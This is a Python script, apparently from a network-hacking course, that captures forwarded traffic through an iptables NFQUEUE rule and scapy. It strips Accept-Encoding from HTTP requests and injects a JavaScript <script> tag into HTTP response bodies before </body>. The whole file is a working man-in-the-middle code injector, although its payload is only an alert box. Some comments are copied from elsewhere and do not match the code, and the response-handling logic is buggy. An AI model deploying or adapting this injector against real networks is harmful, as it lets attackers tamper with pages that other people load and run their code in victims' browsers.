#!/usr/bin/env python

import netfilterqueue, subprocess
import scapy.all as scapy
from scapy.layers import http
import re


def set_header(packet, header):
    # set the loaded response to HTTP 301 redirect from actual file location to specified file location
    packet[http.HTTPRequest].Headers = header

    # Delete the length and checksum field allowing scapy to reset
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def set_load(packet, load):
    # set the loaded response to HTTP 301 redirect from actual file location to specified file location
    packet[scapy.Raw].load = load

    # Delete the length and checksum field allowing scapy to reset
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(http.HTTPRequest) or scapy_packet.haslayer(http.HTTPResponse):
        header = scapy_packet[http.HTTPRequest].Headers
        load = scapy_packet[scapy.Raw].load
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Modifying packet request...")
                modified_header = re.sub("Accept-Encoding:.*?\\r\\n", "", header)
                new_packet = set_header(scapy_packet, modified_header)  # load the modified header into the packet
                packet.set_payload(str(new_packet))    # Set the modified packet as the packet payload
            elif scapy_packet[scapy.TCP].sport == 80 and scapy_packet.haslayer(scapy.Raw):
                print("[+] Packet response...")
                # inject an alert box javascript code into the body of the page
                modified_load = load.replace("</body>", "<script> alert('Hello there');</script></body>")
                new_packet = set_load(scapy_packet, modified_load)  # load the modified load into the packet
                packet.set_payload(str(new_packet)) # Set the modified packet as the packet payload

                # packet.set_payload(str(scapy_packet))   # Set the modeified packet as the packet payload
        except:
            pass

    packet.accept() # Accept packet for forwarding

try:
    # options = get_arguments()

    print("[+] Modifying iptables FORWARD chain...")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # create a queue rule using NFQUEUE in iptables

    queue = netfilterqueue.NetfilterQueue()     # Create a netfilterqueue object
    queue.bind(0, process_packet)   # Bind the queue object to the rule with queue number 0 and the callback function
    queue.run() # Send the queued packets to the callback function

except KeyboardInterrupt:
    print("\n[+] Resetting iptables FORWARD chain...")
    subprocess.call("iptables -D FORWARD -j NFQUEUE --queue-num 0", shell=True) # delete the queue rule in iptables
